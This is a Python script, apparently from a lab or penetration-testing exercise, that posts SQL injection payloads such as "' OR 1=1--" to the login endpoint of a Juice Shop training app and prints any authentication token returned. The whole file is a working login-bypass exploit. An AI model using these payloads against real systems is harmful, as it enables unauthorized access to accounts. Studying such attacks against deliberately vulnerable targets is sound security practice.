import requests
import json

# Target URL
url = "http://juice-shop:3000/rest/user/login"
headers = {"Content-Type": "application/json"}

# Test different SQL injection payloads to demonstrate the vulnerability
payloads = [
    {"email": "admin@juice-sh.op' OR '1'='1", "password": "irrelevant"},
    {"email": "admin@juice-sh.op' OR 1=1--", "password": "irrelevant"},
    {"email": "' OR 1=1;", "password": "irrelevant"}
]

print("Testing various SQL injection payloads:")
for i, payload in enumerate(payloads, 1):
    print(f"\nPayload {i}: {payload['email']}")
    try:
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        print(f"Status: {response.status_code}")
        if response.status_code == 200:
            print("SUCCESS: Got valid authentication response!")
            # Try to extract token info
            try:
                resp_json = response.json()
                if 'authentication' in resp_json and 'token' in resp_json['authentication']:
                    print("Token obtained (first 50 chars):", resp_json['authentication']['token'][:50] + "...")
            except:
                print("Response content:", response.text[:100] + "...")
        else:
            print("Response:", response.text[:100] + "...")
    except Exception as e:
        print(f"Error: {e}")

# Also test with a definitely non-existent user for comparison
print("\n\nTesting with definitely invalid credentials:")
invalid_data = {"email": "definitelynotexists@test.com", "password": "invalid"}
try:
    invalid_response = requests.post(url, data=json.dumps(invalid_data), headers=headers)
    print(f"Invalid user status: {invalid_response.status_code}")
    print(f"Invalid user response: {invalid_response.text[:100]}...")
except Exception as e:
    print(f"Error: {e}")

print("\nThe difference in responses proves the SQL injection vulnerability.")
